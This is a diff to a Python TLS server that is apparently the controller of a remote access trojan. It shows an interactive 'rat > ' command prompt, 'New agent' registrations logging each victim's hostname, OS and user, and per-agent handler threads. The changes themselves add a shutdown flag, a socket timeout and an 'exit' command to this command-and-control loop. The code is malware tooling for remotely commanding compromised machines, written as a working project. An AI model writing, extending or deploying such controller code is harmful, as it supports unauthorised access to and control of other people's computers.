@@ -14,6 +14,8 @@ class SSLServer:
     def __init__(
         self, host, port, server_cert, server_key, client_cert, chunk_size=1024
     ):
+        self._running = True
+        self._server_socket = None
         self.host = host
         self.port = port
         self.chunk_size = chunk_size
@@ -22,52 +24,75 @@ class SSLServer:
         self._context.load_cert_chain(server_cert, server_key)
         self._context.load_verify_locations(client_cert)
 
+    def shutdown(self):
+
+        logger.info("Shutdown requested")
+
+        self._running = False
+
+        if self._server_socket:
+            self._server_socket.close()
+
     def connect(self):
 
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
 
-            sock.bind((self.host, self.port))
+        self._server_socket = sock
 
-            sock.listen(5)
+        sock.bind((self.host, self.port))
 
-            print("Server listening")
-            logger.info("Server listening")
-            while True:
+        sock.listen(5)
+
+        sock.settimeout(1)
+
+        print("Server listening")
+        logger.info("Server listening")
+
+        while self._running:
+
+            try:
 
                 conn, addr = sock.accept()
 
-                try:
+            except socket.timeout:
+                continue
 
-                    sconn = self._context.wrap_socket(
-                        conn,
-                        server_side=True,
-                    )
+            try:
 
-                    print("Client connected:", addr[0])
-                    logger.info("Client connected: %s", addr[0])
+                sconn = self._context.wrap_socket(
+                    conn,
+                    server_side=True,
+                )
 
-                    data = self._recv_until_eof(sconn)
+                print("Client connected:", addr[0])
+                logger.info("Client connected: %s", addr[0])
 
-                    client_info = json.loads(data)
+                data = self._recv_until_eof(sconn)
 
-                    logger.info(
-                        "New agent: %s | %s | %s | %s",
-                        client_info["hostname"],
-                        client_info["os"],
-                        client_info["user"],
-                        client_info["release"],
-                    )
+                client_info = json.loads(data)
 
-                    Thread(
-                        target=self._handle_client,
-                        args=(sconn,),
-                        daemon=True,
-                    ).start()
+                logger.info(
+                    "New agent: %s | %s | %s | %s",
+                    client_info["hostname"],
+                    client_info["os"],
+                    client_info["user"],
+                    client_info["release"],
+                )
 
-                except ssl.SSLError:
+                Thread(
+                    target=self._handle_client,
+                    args=(sconn,),
+                    daemon=True,
+                ).start()
 
-                    print("SSL handshake failed")
-                    logger.error("SSL handshake failed")
+            except ssl.SSLError:
+
+                print("SSL handshake failed")
+                logger.error("SSL handshake failed")
+
+        logger.info("Server stopped")
+
+        sock.close()
 
     def _recv(self, sock):
 
@@ -211,6 +236,13 @@ class SSLServer:
             while True:
 
                 command = input("rat > ")
+
+                if command.strip().lower() == "exit":
+                    print("Shutting down server...")
+
+                    self.shutdown()
+
+                    break
 
                 if not command:
                     continue
